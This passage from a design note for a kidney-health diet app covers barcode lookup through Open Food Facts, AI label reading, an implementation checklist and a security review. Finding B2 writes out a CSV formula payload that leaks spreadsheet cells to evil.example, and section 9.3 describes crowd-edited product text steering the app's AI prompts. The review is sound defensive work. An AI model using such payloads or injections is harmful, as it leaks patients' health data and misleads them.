| XSS through OFF product text | Low | Session theft | `textContent` only, length caps, CSP + Trusted Types (note 01), a test that greps for HTML sinks |
| ODbL non-compliance on public instances | Low | Licence breach | Attribution in the sheet, About page and CSV; §4.6 via the public mapping code; no OFF data in the repo |
| Vendored code goes stale or vulnerable | Medium | Decoder bugs | `vendor/README.md` with versions and hashes; Dependabot cannot see vendored files, so add a scheduled CI job that compares the versions with npm `latest` (warn only) |

---

## 6. Implementation checklist

Each step lands with its tests. `python -m pytest` must stay offline.

**Contract first**

1. [ ] Update `ARCHITECTURE.md`:
   * `FOOD_SOURCES += off` and `FLAGS += potassium_additive`, with its warning rule (R5);
   * the new `foods` columns and the `barcode_cache` table (R6);
   * `POST /api/foods/barcode`, `POST /api/vision/label` and `POST /api/vision/plate`, with their
     shapes and error codes;
   * the optional `Food` fields, the `gtin` on `FoodCreate` and `/api/log/quick`, and the CSV
     columns.
2. [ ] Add the potassium-additive rule and its sources (Parpia 2018, Sherman 2009, Picard 2019,
   KDIGO 2024 Fig 33) to `docs/research/fact-check.md`. Get the owner's or a dietitian's sign-off
   on "`high` when unknown".

**Backend, pure parts**

3. [ ] `app/gtin.py` + `tests/test_gtin.py`:
   * UPC-A/EAN-13/EAN-8/GTIN-14, and UPC-E expansion (all 4 last-digit cases);
   * check digit;
   * prefixes 02x/04x/2xx/977/978/979/05x/98x/99;
   * the three measured decoder outputs of the same product normalise to `00049000028911`.
4. [ ] `app/additives.py` + `tests/test_additives.py`:
   * every E-code in R5;
   * tags with and without sub-codes (`en:e451i`);
   * US names ("sodium tripolyphosphate", "dipotassium phosphate", "potassium lactate",
     "cream of tartar");
   * exclusions ("phosphatidylserine", "soy lecithin (phospholipids)");
   * trace-only cases ("potassium sorbate" → note, no flag);
   * KCl first ingredient → `avoid_ckd`; localised words (`kalium`, `fosfato`).
5. [ ] `app/nutrients.py`: `potassium_additive` in `FLAGS` and in `food_warnings()`. Mirror the
   rule in `app.js` (`evaluateWarnings`) and the preview parity test.
   `scripts/build_food_db.py` must accept the new flag; no builtin food needs it today.

**Backend, OFF and USDA**

6. [ ] Record fixtures with a dev script (`scripts/record_off_fixtures.py`, using staging or live
   with the project User-Agent): Diet Coke `0049000028911`, Kraft `0021000658831`
   (prepared-only), Lay's `0028400090858`, Nutella `3017624010701` (EU, salt), one v3.6 response,
   one 404. Add `tests/fixtures/off/README.md` with the ODbL notice.
7. [ ] `app/off.py`:
   * request builder with the exact `fields` list and User-Agent;
   * 1 MB response cap; pacing bucket; 503 retry;
   * mapping per the R3 table; serving logic; quality checks; category map;
   * `parse_nutrition_v35()`.

   Tests: per-fixture expected `Food` (sodium from salt for Nutella; prepared label for Kraft;
   `counts_as_fluid` and `phosphate_additive` for Diet Coke; `phosphate_additive` from `en:e451`
   for Kraft); an empty-`nutriments` guard; the bucket refuses the 11th call in a minute.
8. [ ] USDA branded in `app/foods.py`/`app/barcode.py`: candidate forms, exact `gtinUpc` match,
   `labelNutrients` with `postassium`/`potassium`, merge rule. Use recorded FDC fixtures.
9. [ ] `app/db.py` migration step + `tests/test_migrations.py`: a v0.2 database upgrades; the
   columns, index and table exist; old rows have `quality_json='[]'`.
10. [ ] `app/barcode.py` `POST /api/foods/barcode`: lookup order local → OFF → FDC; 200 vs 201;
    400 reasons; 404 with `name`; 429; 503 when disabled; negative cache TTL; `refresh` limited to
    once a day.
    Tests mock `httpx` through a transport and must never touch the network.
11. [ ] `gtin` on `FoodCreate`, `/api/log/quick` and `/api/foods/{id}/copy`. Custom food lookup
    wins over the cache. Add `source` and `source_license` to the CSV export.

**Frontend**

12. [ ] Vendor the R7 files from the npm tarballs (`npm pack barcode-detector@3.2.2
    zxing-wasm@3.1.3`, then copy). Write `vendor/README.md` with versions, SHA-256 and update
    steps.
    Test: the hashes match, and the hash of `zxing_reader.wasm` equals the `ZXING_WASM_SHA256`
    string in `ponyfill.iife.js`.
13. [ ] `index.html`: static `<script defer>` for the ponyfill. With note 01's CSP, add
    `'wasm-unsafe-eval'` to `script-src` and assert it in the security-headers test.
14. [ ] `scan.js`: native/ponyfill selection, lazy WASM, the three entry points, two-read
    confirmation, the result sheet with attribution and quality notes, "not listed" display, and
    the 404 → Quick add path with the GTIN.
    Manual test on iPhone (HTTP: photo and typed; HTTPS: live), Android Chrome (native detector)
    and desktop. Then a Playwright test with a generated barcode PNG through the photo path.
15. [ ] Quick add: the photo-beside-form panel, the Ingredients box, and the additive scan on save
    (server side).

**AI (after the AI note's provider layer exists)**

16. [ ] `app/vision.py`:
    * raw-body reader with a streaming cap; `413`/`415`;
    * JPEG magic check; no disk, no logs of bytes or model text;
    * provider call with the `json_schema` when supported; strict Pydantic re-validation;
    * post-processing; `503` when disabled; refuse agent providers unless allowed.

    Tests use a fake provider (valid JSON, invalid JSON, out-of-bounds numbers, extra keys,
    timeout).
17. [ ] UI for "Read the label for me" (fields marked "from photo") and the plate checklist with
    its banner. Default off. Per-provider consent text.

**Docs and ops**

18. [ ] `docs/barcode-and-photos.md` (user guide), README feature list and configuration table,
    `docs/network-allowlist.md`, the k8s NetworkPolicy/Cilium FQDN for `world.openfoodfacts.org`,
    and an About-page attribution.
19. [ ] Fill in the OFF API usage form and set `OFF_CONTACT` in the docs. Add a CI job (scheduled,
    warn-only) that compares the vendored versions with npm `latest` and runs the live OFF fixture
    check against staging.

---

## 7. How to re-verify

```bash
# OFF: does 3.4 still return flat nutriments, and what is the newest API version?
UA='KidneyHealth/dev (https://github.com/ksullivan86/kidney-health)'
for v in v3.4 v3.6; do curl -s -A "$UA" \
  "https://world.openfoodfacts.org/api/$v/product/3017624010701.json?fields=nutriments,schema_version" \
  | python3 -c 'import json,sys; p=json.load(sys.stdin)["product"]; print(p["schema_version"], len(p["nutriments"]))'; done
curl -s https://raw.githubusercontent.com/openfoodfacts/openfoodfacts-server/main/docs/api/index.md | grep -n "req/min\|Current\|Deprecated"

# Decoder versions and the pinned WASM
npm view barcode-detector version dependencies; npm view zxing-wasm version
# BarcodeDetector support (MDN BCD)
npm view @mdn/browser-compat-data version   # then inspect api.BarcodeDetector in data.json
curl -s "https://bugs.webkit.org/rest/bug/281848?include_fields=status,last_change_time"
```

**Coverage table (F1).** DuckDB 1.5.6 with `httpfs`, against
`https://huggingface.co/datasets/openfoodfacts/product-database/resolve/main/food.parquet`. It
projects `countries_tags`, `unique_scans_n`, `serving_quantity`, `additives_tags` and
`list_filter(nutriments, x -> x.name in (...))`, about 350 MB of column chunks and about 5 minutes.
Re-run it before quoting the numbers in user docs:

```python
import duckdb  # pip install duckdb==1.5.6
con = duckdb.connect(); con.execute("INSTALL httpfs; LOAD httpfs;")
url = "https://huggingface.co/datasets/openfoodfacts/product-database/resolve/main/food.parquet"
has = lambda n: (f"round(avg(coalesce(len(list_filter(n, x -> x.name='{n}' and (x.\"100g\" is not null "
                 f"or x.serving is not null or x.prepared_100g is not null)))>0,false)::int),3)")
print(con.execute(f"""
  with t as (select coalesce(list_contains(countries_tags,'en:united-states'),false) us,
                    coalesce(unique_scans_n,0)>=10 popular, serving_quantity, additives_tags,
                    list_filter(nutriments, x -> x.name in ('sodium','potassium','phosphorus','energy-kcal')) n
             from read_parquet('{url}'))
  select us, popular, count(*), {has('energy-kcal')}, {has('sodium')}, {has('potassium')}, {has('phosphorus')},
         round(avg(coalesce(try_cast(serving_quantity as double)>0,false)::int),3),
         round(avg(coalesce(len(list_filter(additives_tags, a -> regexp_matches(a,
               '^en:e(338|339|340|341|343|450|451|452|541)')))>0,false)::int),3)
  from t group by all order by all""").fetchall())
```

Also re-check:

* the vision model list on [ollama.com](https://ollama.com/search?c=vision) and the cheapest
  OpenAI image model;
* the commercial pricing pages in F4, once a year.

---

## 8. Sources

* Open Food Facts:
  * [API introduction (v3 current, v2 deprecated, rate limits, User-Agent)](https://openfoodfacts.github.io/openfoodfacts-server/api/)
  * [API and product schema change log](https://github.com/openfoodfacts/openfoodfacts-server/blob/main/docs/api/ref-api-and-product-schema-change-log.md)
  * [Barcode normalisation](https://github.com/openfoodfacts/openfoodfacts-server/blob/main/docs/api/ref-barcode-normalization.md)
  * [Nutrition schema](https://github.com/openfoodfacts/openfoodfacts-server/blob/main/docs/api/ref/schemas/product_nutrition.yaml)
  * [Terms of use](https://world.openfoodfacts.org/terms-of-use)
  * [Product database on Hugging Face](https://huggingface.co/datasets/openfoodfacts/product-database)
  * [OCR wiki](https://wiki.openfoodfacts.org/OCR)
* [Open Database License 1.0](https://opendatacommons.org/licenses/odbl/1-0/)
* USDA FoodData Central: [API guide](https://fdc.nal.usda.gov/api-guide/), [OpenAPI spec](https://fdc.nal.usda.gov/api-spec/fdc_api.yaml), [help](https://fdc.nal.usda.gov/help/)
* FDA, [Changes to the Nutrition Facts Label](https://www.fda.gov/food/nutrition-facts-label/changes-nutrition-facts-label); [Regulation (EU) No 1169/2011](https://eur-lex.europa.eu/eli/reg/2011/1169/oj)
* GS1, [prefix list](https://www.gs1.org/prefixes)
* Commercial APIs:
  * Nutritionix: [pricing](https://www.nutritionix.com/api), [developer portal](https://developer.nutritionix.com/)
  * Edamam: [Food Database pricing](https://developer.edamam.com/food-database-api), [attribution](https://developer.edamam.com/attribution)
  * FatSecret: [editions](https://platform.fatsecret.com/api-editions), [find_id_for_barcode v2](https://platform.fatsecret.com/docs/v2/food.find_id_for_barcode)
  * Spoonacular: [pricing](https://spoonacular.com/food-api/pricing), [terms](https://spoonacular.com/food-api/terms)
  * [Passio pricing](https://www.passio.ai/pricing), [LogMeal pricing](https://logmeal.com/api/pricing/)
* Decoders:
  * [`barcode-detector`](https://github.com/Sec-ant/barcode-detector), [`zxing-wasm`](https://github.com/Sec-ant/zxing-wasm), [ZXing-C++](https://github.com/zxing-cpp/zxing-cpp)
  * [MDN browser-compat-data](https://github.com/mdn/browser-compat-data)
  * WebKit bugs [281848](https://bugs.webkit.org/show_bug.cgi?id=281848) and [282327](https://bugs.webkit.org/show_bug.cgi?id=282327)
  * [Tesseract.js](https://github.com/naptha/tesseract.js)
* AI providers:
  * [Ollama OpenAI compatibility](https://docs.ollama.com/api/openai-compatibility), [Ollama vision models](https://ollama.com/search?c=vision)
  * OpenAI: [gpt-6-luna](https://developers.openai.com/api/docs/models/gpt-6-luna), [data controls](https://developers.openai.com/api/docs/guides/your-data)
  * [Hermes Agent API server](https://hermes-agent.nousresearch.com/docs/user-guide/features/api-server)
  * [Llama 3.2 acceptable use policy](https://github.com/meta-llama/llama-models/blob/main/models/llama3_2/USE_POLICY.md)
  * Model cards: [Qwen3-VL-8B](https://huggingface.co/Qwen/Qwen3-VL-8B-Instruct), [Gemma 4 12B](https://huggingface.co/google/gemma-4-12B-it)
* Evidence:
  * Sherman RA, Mehta O. *CJASN* 2009;4:1370. [doi:10.2215/CJN.02830409](https://doi.org/10.2215/CJN.02830409)
  * Parpia AS et al. *J Ren Nutr* 2018;28:83. [doi:10.1053/j.jrn.2017.08.013](https://doi.org/10.1053/j.jrn.2017.08.013)
  * Picard K. *J Ren Nutr* 2019;29:350. [doi:10.1053/j.jrn.2018.10.003](https://doi.org/10.1053/j.jrn.2018.10.003)
  * Bernier-Jean A et al. *Semin Nephrol* 2026. [doi:10.1016/j.semnephrol.2026.151727](https://doi.org/10.1016/j.semnephrol.2026.151727)
  * Lambert K et al. *Semin Nephrol* 2026. [doi:10.1016/j.semnephrol.2026.151728](https://doi.org/10.1016/j.semnephrol.2026.151728)
  * Fridolfsson J et al. *Curr Dev Nutr* 2025;9:107556. [doi:10.1016/j.cdnut.2025.107556](https://doi.org/10.1016/j.cdnut.2025.107556)
  * Nakagawa S, Yamamoto A. *Nutrients* 2026;18:2892. [doi:10.3390/nu18172892](https://doi.org/10.3390/nu18172892)
  * Assiri FY et al. *J Imaging* 2025;11:271. [doi:10.3390/jimaging11080271](https://doi.org/10.3390/jimaging11080271)

---

## 9. Security review (2026-10-05)

Reviewed together with notes [01](01-rootless-and-security.md), [04](04-optional-ai.md) and
[07](07-accounts-settings-secrets.md). Decoding on the device and sending only digits, read-only
shared rows, length caps and `textContent` rendering are the right defaults. The new risk this note
introduces is that **crowd-sourced text** (Open Food Facts can be edited by anyone) now flows into
every user's food list, exports and AI prompts, and that photo bytes now reach C/C++ parsers on
the AI backend.

### 9.1 Corrected in place

| Where | Was | Now |
|---|---|---|
| §1 constraints, F5 | Note 01 CSP with `trusted-types 'none'` | `trusted-types kh-sw`; the static `<script defer>` conclusion is unchanged (`script.src` still throws, now confirmed for Safari 26 as well). |
| F9 | SSRF "handled by note 01 … `ALLOW_PRIVATE_AI_HOSTS`" | Note 04 R5 and `AI_PRIVATE_HOSTS`. |
| R10 | `MAX_IMAGE_BYTES` "below note 01's `MAX_UPLOAD_BYTES`" | Note 01 now uses `MAX_IMAGE_BYTES`; there is no multipart limit. |

### 9.2 Findings and required changes

| ID | Severity | Finding | Required change |
|---|---|---|---|
| B1 | **High** | **Photo bytes reach native parsers unchecked.** R8 relies on "does not decode the image", but the vision backend does: a public proof of concept shows a stack overflow in llama.cpp's `mtmd/clip.cpp` from a 52800×44 image ([PoC](https://huggingface.co/igfray/minicpmv-bucket-coords-stack-overflow-poc)), and a 4 MiB JPEG can declare 65535×65535 pixels. The canvas re-encode on the phone is not a control, because any signed-in user can call the route directly; for the same reason EXIF/GPS stripping was not enforced. The endpoint names also diverge (`/api/vision/label` and `/api/vision/plate` here, `/api/ai/read-label` and `/api/ai/identify-food` in note 04). | Use the shared `app/imagecheck.py` (note 01 §10 S5, note 04 §9 A4): `Content-Type: image/jpeg`, `Content-Length` ≤ `MAX_IMAGE_BYTES` before reading and a streaming cap while reading, SOI magic, one SOF0/1/2 frame, 16–2048 px per side, aspect ≤ 4:1, ≤ 4 megapixels; remove APP1–APP15, COM and bytes after EOI; forward only the rewritten JPEG. One router for all photo routes, registered only when AI is enabled (so it answers 404 otherwise); pick note 04's `/api/ai/*` names and map `/api/vision/plate` to `/api/ai/identify-food` with the plate fields. |
| B2 | **High** | **CSV formula injection.** OFF product names and brands land in `GET /api/log/export.csv` and note 07's export zip, which people send to their dietitian, who opens them in Excel or LibreOffice. A name such as `=HYPERLINK("https://evil.example/?d="&A2,"Banana")` turns into a working link that leaks cells when clicked. `app/log.py` writes cells unescaped today. | Every CSV writer (`log.csv`, `foods.csv`, `meals.csv`, `labs.csv`) prefixes a string cell that starts with `=`, `+`, `-`, `@`, TAB, CR or LF with `'` ([OWASP CSV Injection](https://community.owasp.org/attacks/CSV_Injection)). Numbers stay numbers, so negative values are untouched. Test each leading character. |
| B3 | Medium | **Invisible characters defeat the additive scan.** A zero-width space or soft hyphen inside "phos​phate" or "potassium­chloride" (both Unicode `Cf`) keeps the R5 regexes from matching, so `phosphate_additive` or `potassium_additive` is silently missing (a safety false negative). Bidi controls (U+202A–202E, U+2066–2069) make a stored name display differently from what it is. | Before storing and before scanning: NFKC, then remove every `Cf` character and every `Cc` character except TAB and LF (`ingredients_text` keeps LF), then collapse whitespace. Apply to `product_name`, `generic_name`, `brands`, `serving_size`, `ingredients_text`, and to AI-read label text. Tests: zero-width, soft hyphen and bidi variants still set the flags. |
| B4 | Medium | **URLs from upstream.** The UI renders an attribution link; a URL taken from the payload could be `javascript:` or point anywhere. | Build `source_url` on the server from a constant (`https://world.openfoodfacts.org/product/` + `off_code(gtin)`, digits only); never copy a URL from the OFF or FDC payload; never fetch product images. The UI sets `href` only when `new URL(u).protocol === 'https:'`, with `rel="noopener noreferrer"`. |
| B5 | Medium | **`OFF_BASE_URL` must not be runtime-editable.** Note 07's registry lists `food.off_*` keys with "…". An admin-editable base URL is an SSRF path and lets one admin feed fabricated nutrient values to every user. | `OFF_BASE_URL` is env-only, outside the settings registry; `https://` required (plain `http://` only for `localhost`); `follow_redirects=False`. |
| B6 | Medium | **Response caps must count decoded bytes.** httpx decodes gzip, br and zstd transparently; a cap on `iter_raw()` lets a small compressed body inflate in memory. | Count bytes from `iter_bytes()`; send `Accept-Encoding: gzip`; caps 1 MiB decoded for OFF and 2 MiB for FDC food records; abort and answer 502 beyond. |
| B7 | Low | **Cross-user oracle.** `200 (cached)` vs `201 (new)` and `"source": "local"` tell user B that someone on the instance already scanned this product; R6 itself says which products a person scans is personal. | Always `200` for a found product, no cache indicator; `refresh` is limited per user (once per GTIN per day) and shares one upstream call. The cache-hit timing difference remains; document it as accepted. |
| B8 | Low | **GTIN lookup isolation.** "The user's own custom foods first" must not become "anyone's custom food with this GTIN". | Query `(f.source = 'custom' AND f.owner_user_id = :uid) OR f.source IN ('off', 'usda')`; add to note 07's two-user isolation matrix. |
| B9 | Low | **Vendored decoder integrity.** SHA-256 values are recorded after extraction, which proves only that the file did not change since vendoring. | The vendoring script first checks the npm tarball against the registry's `dist.integrity` (SHA-512) from `npm view barcode-detector@3.2.2 dist.integrity` (and the same for `zxing-wasm@3.1.3`), then extracts and records SHA-256 as planned. |
| B10 | Low | **Two switches for agent providers.** `AI_VISION_ALLOW_AGENT` here, a tool probe in note 04. | Keep `AI_VISION_ALLOW_AGENT=false` as the default **and** require note 04's Hermes probe (enabled toolsets empty, re-checked ≤ 5 min before each vision call). Either failing refuses the call. |
| B11 | Low | **Negative-cache growth.** Random valid GTINs each add a `barcode_cache` row. | Purge `not_found` and `no_nutrition` rows older than `BARCODE_NEGATIVE_TTL_HOURS` daily. |

### 9.3 Prompt injection from product data

OFF names enter note 04's next-meal context (as candidate names) and package text enters
read-label. As written, an OFF editor could steer the free-text `why` sentence a patient reads and
close the `<data>` block with `</data>`. Note 04 §9 A2/A3 remove model free text and escape the
delimiter; B3 here removes invisible characters before the text is stored, so the prompt, the
additive scan and the UI see the same string. `ingredients_text` is never put into AI prompts.

### 9.4 Implementation checklist additions

- [ ] `app/imagecheck.py` wired into the photo routes; one router with note 04's names (B1).
- [ ] CSV escaping in every writer (B2).
- [ ] `app/textclean.py`: NFKC + `Cf`/`Cc` removal, used by `off.py`, the FDC mapper, the AI label reader and the additive scan (B3).
- [ ] Server-built `source_url`; `https:` check in `scan.js` (B4).
- [ ] `OFF_BASE_URL` env-only (B5); decoded-byte caps (B6); uniform 200 and per-user refresh (B7); GTIN query isolation test (B8); `dist.integrity` check (B9); agent double switch (B10); negative-cache purge (B11).

### 9.5 Sources checked for this review

[OWASP CSV Injection](https://community.owasp.org/attacks/CSV_Injection) ·
[MDN Trusted Types API](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API) ·
[llama.cpp mtmd PoC](https://huggingface.co/igfray/minicpmv-bucket-coords-stack-overflow-poc) ·
repository code: `app/log.py` (CSV writer), `app/foods.py`.
